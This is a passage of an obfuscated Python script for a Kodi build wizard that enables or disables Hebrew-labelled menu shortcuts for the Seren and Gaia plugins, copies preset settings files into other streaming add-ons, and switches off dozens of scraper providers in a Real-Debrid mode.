		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1354
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1357
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1358
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1362
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1363
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1364
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1382
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1385
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1386
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1390
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1391
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1392
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1410
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1413
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1414
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1417
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1418
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1419
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1437
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1440
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1441
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1443
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1444
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1445
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1463
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1466
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1467
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1469
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1470
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1471
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1489
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1492
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1493
    OO0O0OOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1496
    with open (OO0O0OOOO00O0OOO0 ,'r')as O00OOO0OOOO0O000O :#line:1497
      OOO0O0O00OOOOOOO0 =O00OOO0OOOO0O000O .read ()#line:1498
    OOO0O0O00OOOOOOO0 =OOO0O0O00OOOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1516
    with open (OO0O0OOOO00O0OOO0 ,'w')as O00OOO0OOOO0O000O :#line:1519
      O00OOO0OOOO0O000O .write (OOO0O0O00OOOOOOO0 )#line:1520
def rdbuildinstalloff ():#line:1523
    try :#line:1524
       O0OOO0O00000000O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1525
       O0O0OOOOO0O0OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1526
       copyfile (O0OOO0O00000000O0 ,O0O0OOOOO0O0OOO00 )#line:1528
       O0OOO0O00000000O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1530
       O0O0OOOOO0O0OOO00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1531
       copyfile (O0OOO0O00000000O0 ,O0O0OOOOO0O0OOO00 )#line:1533
       O0OOO0O00000000O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1535
       O0O0OOOOO0O0OOO00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1536
       copyfile (O0OOO0O00000000O0 ,O0O0OOOOO0O0OOO00 )#line:1538
       O0OOO0O00000000O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1541
       O0O0OOOOO0O0OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1542
       copyfile (O0OOO0O00000000O0 ,O0O0OOOOO0O0OOO00 )#line:1544
    except :#line:1546
       pass #line:1547
def rdbuildaddonON ():#line:1554
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1556
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1557
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1558
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1576
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1579
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1580
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1584
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1585
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1586
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1604
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1607
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1608
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1612
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1613
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1614
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1632
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1635
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1636
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1640
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1641
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1642
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1660
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1663
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1664
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1667
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1668
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1669
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1687
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1690
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1691
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1693
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1694
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1695
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1713
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1716
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1717
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1719
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1720
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1721
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1739
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1742
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1743
    O0O0O000O0000OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1746
    with open (O0O0O000O0000OOO0 ,'r')as OOO00O00OOOO0O0O0 :#line:1747
      O00OOO00OOO0OOOOO =OOO00O00OOOO0O0O0 .read ()#line:1748
    O00OOO00OOO0OOOOO =O00OOO00OOO0OOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1766
    with open (O0O0O000O0000OOO0 ,'w')as OOO00O00OOOO0O0O0 :#line:1769
      OOO00O00OOOO0O0O0 .write (O00OOO00OOO0OOOOO )#line:1770
def rdbuildinstallON ():#line:1773
    try :#line:1775
       OOO0O00O000OO0000 =ADDONPATH +"/resources/rd/victory.xml"#line:1776
       OO0OOO0OOO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1777
       copyfile (OOO0O00O000OO0000 ,OO0OOO0OOO0OOOO0O )#line:1779
       OOO0O00O000OO0000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1781
       OO0OOO0OOO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1782
       copyfile (OOO0O00O000OO0000 ,OO0OOO0OOO0OOOO0O )#line:1784
       OOO0O00O000OO0000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1786
       OO0OOO0OOO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1787
       copyfile (OOO0O00O000OO0000 ,OO0OOO0OOO0OOOO0O )#line:1789
       OOO0O00O000OO0000 =ADDONPATH +"/resources/rd/Splash.png"#line:1792
       OO0OOO0OOO0OOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1793
       copyfile (OOO0O00O000OO0000 ,OO0OOO0OOO0OOOO0O )#line:1795
    except :#line:1797
       pass #line:1798
def rdbuild ():#line:1808
	OOOO0O0000O0OO00O =(ADDON .getSetting ("auto_rd"))#line:1809
	if OOOO0O0000O0OO00O =='true':#line:1810
		O0OOO000OOO00O0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1811
		O0OOO000OOO00O0OO .setSetting ('all_t','0')#line:1812
		O0OOO000OOO00O0OO .setSetting ('rd_menu_enable','false')#line:1813
		O0OOO000OOO00O0OO .setSetting ('magnet_bay','false')#line:1814
		O0OOO000OOO00O0OO .setSetting ('magnet_extra','false')#line:1815
		O0OOO000OOO00O0OO .setSetting ('rd_only','false')#line:1816
		O0OOO000OOO00O0OO .setSetting ('ftp','false')#line:1818
		O0OOO000OOO00O0OO .setSetting ('fp','false')#line:1819
		O0OOO000OOO00O0OO .setSetting ('filter_fp','false')#line:1820
		O0OOO000OOO00O0OO .setSetting ('fp_size_en','false')#line:1821
		O0OOO000OOO00O0OO .setSetting ('afdah','false')#line:1822
		O0OOO000OOO00O0OO .setSetting ('ap2s','false')#line:1823
		O0OOO000OOO00O0OO .setSetting ('cin','false')#line:1824
		O0OOO000OOO00O0OO .setSetting ('clv','false')#line:1825
		O0OOO000OOO00O0OO .setSetting ('cmv','false')#line:1826
		O0OOO000OOO00O0OO .setSetting ('dl20','false')#line:1827
		O0OOO000OOO00O0OO .setSetting ('esc','false')#line:1828
		O0OOO000OOO00O0OO .setSetting ('extra','false')#line:1829
		O0OOO000OOO00O0OO .setSetting ('film','false')#line:1830
		O0OOO000OOO00O0OO .setSetting ('fre','false')#line:1831
		O0OOO000OOO00O0OO .setSetting ('fxy','false')#line:1832
		O0OOO000OOO00O0OO .setSetting ('genv','false')#line:1833
		O0OOO000OOO00O0OO .setSetting ('getgo','false')#line:1834
		O0OOO000OOO00O0OO .setSetting ('gold','false')#line:1835
		O0OOO000OOO00O0OO .setSetting ('gona','false')#line:1836
		O0OOO000OOO00O0OO .setSetting ('hdmm','false')#line:1837
		O0OOO000OOO00O0OO .setSetting ('hdt','false')#line:1838
		O0OOO000OOO00O0OO .setSetting ('icy','false')#line:1839
		O0OOO000OOO00O0OO .setSetting ('ind','false')#line:1840
		O0OOO000OOO00O0OO .setSetting ('iwi','false')#line:1841
		O0OOO000OOO00O0OO .setSetting ('jen_free','false')#line:1842
		O0OOO000OOO00O0OO .setSetting ('kiss','false')#line:1843
		O0OOO000OOO00O0OO .setSetting ('lavin','false')#line:1844
		O0OOO000OOO00O0OO .setSetting ('los','false')#line:1845
		O0OOO000OOO00O0OO .setSetting ('m4u','false')#line:1846
		O0OOO000OOO00O0OO .setSetting ('mesh','false')#line:1847
		O0OOO000OOO00O0OO .setSetting ('mf','false')#line:1848
		O0OOO000OOO00O0OO .setSetting ('mkvc','false')#line:1849
		O0OOO000OOO00O0OO .setSetting ('mjy','false')#line:1850
		O0OOO000OOO00O0OO .setSetting ('hdonline','false')#line:1851
		O0OOO000OOO00O0OO .setSetting ('moviex','false')#line:1852
		O0OOO000OOO00O0OO .setSetting ('mpr','false')#line:1853
		O0OOO000OOO00O0OO .setSetting ('mvg','false')#line:1854
		O0OOO000OOO00O0OO .setSetting ('mvl','false')#line:1855
		O0OOO000OOO00O0OO .setSetting ('mvs','false')#line:1856
		O0OOO000OOO00O0OO .setSetting ('myeg','false')#line:1857
		O0OOO000OOO00O0OO .setSetting ('ninja','false')#line:1858
		O0OOO000OOO00O0OO .setSetting ('odb','false')#line:1859
		O0OOO000OOO00O0OO .setSetting ('ophd','false')#line:1860
		O0OOO000OOO00O0OO .setSetting ('pks','false')#line:1861
		O0OOO000OOO00O0OO .setSetting ('prf','false')#line:1862
		O0OOO000OOO00O0OO .setSetting ('put18','false')#line:1863
		O0OOO000OOO00O0OO .setSetting ('req','false')#line:1864
		O0OOO000OOO00O0OO .setSetting ('rftv','false')#line:1865
		O0OOO000OOO00O0OO .setSetting ('rltv','false')#line:1866
		O0OOO000OOO00O0OO .setSetting ('sc','false')#line:1867
		O0OOO000OOO00O0OO .setSetting ('seehd','false')#line:1868
		O0OOO000OOO00O0OO .setSetting ('showbox','false')#line:1869
		O0OOO000OOO00O0OO .setSetting ('shuid','false')#line:1870
		O0OOO000OOO00O0OO .setSetting ('sil_gh','false')#line:1871
		O0OOO000OOO00O0OO .setSetting ('spv','false')#line:1872
		O0OOO000OOO00O0OO .setSetting ('subs','false')#line:1873
		O0OOO000OOO00O0OO .setSetting ('tvs','false')#line:1874
		O0OOO000OOO00O0OO .setSetting ('tw','false')#line:1875
		O0OOO000OOO00O0OO .setSetting ('upto','false')#line:1876
		O0OOO000OOO00O0OO .setSetting ('vel','false')#line:1877
		O0OOO000OOO00O0OO .setSetting ('vex','false')#line:1878
		O0OOO000OOO00O0OO .setSetting ('vidc','false')#line:1879
		O0OOO000OOO00O0OO .setSetting ('w4hd','false')#line:1880
		O0OOO000OOO00O0OO .setSetting ('wav','false')#line:1881
		O0OOO000OOO00O0OO .setSetting ('wf','false')#line:1882
		O0OOO000OOO00O0OO .setSetting ('wse','false')#line:1883
		O0OOO000OOO00O0OO .setSetting ('wss','false')#line:1884
		O0OOO000OOO00O0OO .setSetting ('wsse','false')#line:1885
		O0OOO000OOO00O0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1886
		O0OOO000OOO00O0OO .setSetting ('debrid.only','true')#line:1887
		O0OOO000OOO00O0OO .setSetting ('hosts.captcha','false')#line:1888
		O0OOO000OOO00O0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1889
		O0OOO000OOO00O0OO .setSetting ('provider.123moviehd','false')#line:1890
		O0OOO000OOO00O0OO .setSetting ('provider.300mbdownload','false')#line:1891
		O0OOO000OOO00O0OO .setSetting ('provider.alltube','false')#line:1892
		O0OOO000OOO00O0OO .setSetting ('provider.allucde','false')#line:1893
		O0OOO000OOO00O0OO .setSetting ('provider.animebase','false')#line:1894
		O0OOO000OOO00O0OO .setSetting ('provider.animeloads','false')#line:1895
		O0OOO000OOO00O0OO .setSetting ('provider.animetoon','false')#line:1896
		O0OOO000OOO00O0OO .setSetting ('provider.bnwmovies','false')#line:1897
		O0OOO000OOO00O0OO .setSetting ('provider.boxfilm','false')#line:1898
		O0OOO000OOO00O0OO .setSetting ('provider.bs','false')#line:1899
		O0OOO000OOO00O0OO .setSetting ('provider.cartoonhd','false')#line:1900
		O0OOO000OOO00O0OO .setSetting ('provider.cdahd','false')#line:1901
		O0OOO000OOO00O0OO .setSetting ('provider.cdax','false')#line:1902
		O0OOO000OOO00O0OO .setSetting ('provider.cine','false')#line:1903
		O0OOO000OOO00O0OO .setSetting ('provider.cinenator','false')#line:1904
		O0OOO000OOO00O0OO .setSetting ('provider.cmovieshdbz','false')#line:1905
		O0OOO000OOO00O0OO .setSetting ('provider.coolmoviezone','false')#line:1906
		O0OOO000OOO00O0OO .setSetting ('provider.ddl','false')#line:1907
		O0OOO000OOO00O0OO .setSetting ('provider.deepmovie','false')#line:1908
		O0OOO000OOO00O0OO .setSetting ('provider.ekinomaniak','false')#line:1909
		O0OOO000OOO00O0OO .setSetting ('provider.ekinotv','false')#line:1910
		O0OOO000OOO00O0OO .setSetting ('provider.filiser','false')#line:1911
		O0OOO000OOO00O0OO .setSetting ('provider.filmpalast','false')#line:1912
		O0OOO000OOO00O0OO .setSetting ('provider.filmwebbooster','false')#line:1913
		O0OOO000OOO00O0OO .setSetting ('provider.filmxy','false')#line:1914
		O0OOO000OOO00O0OO .setSetting ('provider.fmovies','false')#line:1915
		O0OOO000OOO00O0OO .setSetting ('provider.foxx','false')#line:1916
		O0OOO000OOO00O0OO .setSetting ('provider.freefmovies','false')#line:1917
		O0OOO000OOO00O0OO .setSetting ('provider.freeputlocker','false')#line:1918
		O0OOO000OOO00O0OO .setSetting ('provider.furk','false')#line:1919
		O0OOO000OOO00O0OO .setSetting ('provider.gamatotv','false')#line:1920
		O0OOO000OOO00O0OO .setSetting ('provider.gogoanime','false')#line:1921
		O0OOO000OOO00O0OO .setSetting ('provider.gowatchseries','false')#line:1922
		O0OOO000OOO00O0OO .setSetting ('provider.hackimdb','false')#line:1923
		O0OOO000OOO00O0OO .setSetting ('provider.hdfilme','false')#line:1924
		O0OOO000OOO00O0OO .setSetting ('provider.hdmto','false')#line:1925
		O0OOO000OOO00O0OO .setSetting ('provider.hdpopcorns','false')#line:1926
		O0OOO000OOO00O0OO .setSetting ('provider.hdstreams','false')#line:1927
		O0OOO000OOO00O0OO .setSetting ('provider.horrorkino','false')#line:1929
		O0OOO000OOO00O0OO .setSetting ('provider.iitv','false')#line:1930
		O0OOO000OOO00O0OO .setSetting ('provider.iload','false')#line:1931
		O0OOO000OOO00O0OO .setSetting ('provider.iwaatch','false')#line:1932
